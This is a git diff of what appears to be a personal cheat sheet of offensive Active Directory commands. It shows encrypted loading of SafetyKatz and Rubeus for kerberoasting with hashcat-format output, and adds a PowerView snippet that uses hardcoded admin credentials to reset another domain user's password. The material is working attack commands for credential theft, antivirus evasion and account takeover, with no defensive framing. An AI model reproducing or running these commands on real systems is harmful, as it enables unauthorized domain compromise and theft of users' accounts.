@@ -23,6 +23,17 @@ Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t
 ```powershell
 Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"
 ```
+
+***
+```powershell
+Import-Module .\PowerView.ps1
+$Username = 'p00_adm'
+$Password = 'ZQ!5t4r'
+$pass = ConvertTo-SecureString -AsPlainText $Password -Force
+$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList
+$Username,$pass
+Set-DomainUserPassword -Identity mr3ks -Password $pass -Credential $Cred
+```
 ***
 
 #https://www.dsinternals.com/en/
